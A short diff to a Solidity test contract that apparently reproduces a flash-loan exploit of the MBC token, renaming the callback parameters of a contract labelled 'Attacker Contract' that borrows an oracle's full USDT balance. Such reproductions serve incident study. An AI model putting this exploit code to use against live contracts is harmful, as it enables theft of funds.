@@ -111,11 +111,11 @@ contract Exploit_MBCToken is TestHarness, TokenBalanceTracker {
         dppOracle.flashLoan(0, usdt.balanceOf(address(dppOracle)), address(this), hex'30');
     }
 
-    function DPPFlashLoanCall(address arg0, uint256 arg1, uint256 arg2, bytes memory ) external {
+    function DPPFlashLoanCall(address sender, uint256 amount1, uint256 amount2, bytes memory ) external {
         require(msg.sender == address(dppOracle), 'Only oracle');
-        require(arg0 == address(this), 'Only requested by this');
+        require(sender == address(this), 'Only requested by this');
 
-        uint256 usdtReceived = arg1 > 0 ? arg1 : arg2;
+        uint256 usdtReceived = amount1 > 0 ? amount1 : amount2;
 
         console.log('===== STEP 2: FLASHLOAN RECEIVED =====');
         logBalancesWithLabel('Attacker Contract', address(this));
